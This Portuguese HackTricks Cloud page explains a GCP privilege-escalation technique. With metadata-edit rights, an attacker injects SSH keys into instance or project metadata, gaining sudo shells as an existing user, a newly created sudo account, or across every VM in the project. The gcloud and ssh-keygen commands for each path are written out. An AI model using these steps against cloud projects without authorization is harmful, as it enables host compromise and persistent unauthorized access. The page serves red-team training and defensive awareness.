# GCP - Adicionar Metadados SSH Personalizados

## GCP - Adicionar Metadados SSH Personalizados

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

### Modificando os metadados <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

A modifica√ß√£o de metadados em uma inst√¢ncia pode levar a **riscos de seguran√ßa significativos se um atacante obtiver as permiss√µes necess√°rias**.

#### **Incorpora√ß√£o de Chaves SSH em Metadados Personalizados**

No GCP, **sistemas Linux** frequentemente executam scripts do [Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). Um componente cr√≠tico disso √© o [daemon de contas](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), que √© projetado para **verificar regularmente** o endpoint de metadados da inst√¢ncia em busca de **atualiza√ß√µes nas chaves p√∫blicas SSH autorizadas**.

Portanto, se um atacante puder modificar metadados personalizados, ele poder√° fazer com que o daemon encontre uma nova chave p√∫blica, que ser√° processada e **integrada ao sistema local**. A chave ser√° adicionada ao arquivo `~/.ssh/authorized_keys` de um **usu√°rio existente ou potencialmente criando um novo usu√°rio com privil√©gios `sudo`**, dependendo do formato da chave. E o atacante poder√° comprometer o host.

#### **Adicionar chave SSH a um usu√°rio privilegiado existente**

1. **Examinar Chaves SSH Existentes na Inst√¢ncia:**
*   Execute o comando para descrever a inst√¢ncia e seus metadados para localizar chaves SSH existentes. A se√ß√£o relevante na sa√≠da estar√° sob `metadata`, especificamente a chave `ssh-keys`.

```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
* Preste aten√ß√£o ao formato das chaves SSH: o nome de usu√°rio precede a chave, separado por dois pontos.
2. **Preparar um Arquivo de Texto para Metadados da Chave SSH:**
* Salve os detalhes dos nomes de usu√°rios e suas respectivas chaves SSH em um arquivo de texto chamado `meta.txt`. Isso √© essencial para preservar as chaves existentes enquanto adiciona novas.
3. **Gerar uma Nova Chave SSH para o Usu√°rio Alvo (`alice` neste exemplo):**
*   Use o comando `ssh-keygen` para gerar uma nova chave SSH, garantindo que o campo de coment√°rio (`-C`) corresponda ao nome de usu√°rio alvo.

```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
* Adicione a nova chave p√∫blica ao `meta.txt`, imitando o formato encontrado nos metadados da inst√¢ncia.
4. **Atualizar os Metadados da Chave SSH da Inst√¢ncia:**
*   Aplique os metadados atualizados da chave SSH √† inst√¢ncia usando o comando `gcloud compute instances add-metadata`.

```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
5. **Acessar a Inst√¢ncia Usando a Nova Chave SSH:**
*   Conecte-se √† inst√¢ncia com SSH usando a nova chave, acessando o shell no contexto do usu√°rio alvo (`alice` neste exemplo).

```bash
ssh -i ./key alice@localhost
sudo id
```

#### **Criar um novo usu√°rio privilegiado e adicionar uma chave SSH**

Se nenhum usu√°rio interessante for encontrado, √© poss√≠vel criar um novo que receber√° privil√©gios `sudo`:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
#### Chaves SSH em n√≠vel de projeto <a href="#sshing-around" id="sshing-around"></a>

√â poss√≠vel ampliar o alcance do acesso SSH a v√°rias M√°quinas Virtuais (VMs) em um ambiente de nuvem **aplicando chaves SSH em n√≠vel de projeto**. Essa abordagem permite o acesso SSH a qualquer inst√¢ncia dentro do projeto que n√£o tenha bloqueado explicitamente as chaves SSH em n√≠vel de projeto. Aqui est√° um guia resumido:

1. **Aplicar Chaves SSH em N√≠vel de Projeto:**
*   Use o comando `gcloud compute project-info add-metadata` para adicionar chaves SSH de `meta.txt` aos metadados do projeto. Essa a√ß√£o garante que as chaves SSH sejam reconhecidas em todas as VMs do projeto, a menos que uma VM tenha a op√ß√£o "Bloquear chaves SSH em n√≠vel de projeto" habilitada.

```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
2. **SSH em Inst√¢ncias Usando Chaves em N√≠vel de Projeto:**
* Com as chaves SSH em n√≠vel de projeto em vigor, voc√™ pode SSH em qualquer inst√¢ncia dentro do projeto. Inst√¢ncias que n√£o bloqueiam chaves em n√≠vel de projeto aceitar√£o a chave SSH, concedendo acesso.
* Um m√©todo direto para SSH em uma inst√¢ncia √© usar o comando `gcloud compute ssh [INSTANCE]`. Este comando usa seu nome de usu√°rio atual e as chaves SSH definidas em n√≠vel de projeto para tentar o acesso.

## Refer√™ncias

* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
